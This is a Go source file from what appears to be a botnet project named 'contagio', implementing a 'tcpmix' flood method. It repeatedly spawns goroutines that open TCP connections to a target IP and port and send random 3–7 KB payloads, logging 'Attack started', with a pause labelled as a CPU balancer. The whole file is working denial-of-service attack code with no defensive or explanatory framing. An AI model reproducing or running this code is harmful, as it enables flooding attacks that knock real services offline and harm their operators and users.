package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"syscall"
	"time"
)

func TcpMixMethod(ctx context.Context, ipaddr string, _port string) {

	defer Catch()

	if config.DEBUG {
		fmt.Println("[tcpmix] Attack started")
	}

	port, err := strconv.Atoi(_port)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[tcpmix atoi] Port atoi error: " + err.Error())
		}
		return
	}

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[tcpmix flood] Attack stopped")
			}
			return
		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[tcpmix flood] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			rand.NewSource(time.Now().UnixNano())

			payload := utils.BuildPayload(rand.Intn(3-1)+1, rand.Intn(7<<10-3<<10)+3<<10)

			go tcpmix(net.ParseIP(ipaddr).To4(), port, payload)
			go tcpmix(net.ParseIP(ipaddr).To4(), port, payload)
			go tcpmix(net.ParseIP(ipaddr).To4(), port, payload)

			time.Sleep(150 * time.Millisecond)
		}
	}
}

func tcpmix(ip net.IP, port int, payload []byte) {

	defer Catch()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	if err != nil {
		return
	}

	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: [4]byte(ip),
	}

	err = syscall.Connect(fd, &addr)
	if err != nil {
		fmt.Println(err)
		return
	}
	syscall.SetNonblock(fd, true)

	for i := 0; i < 20; i++ {
		syscall.Sendto(fd, payload, 0, &addr)
		time.Sleep(30 * time.Millisecond)
	}
}
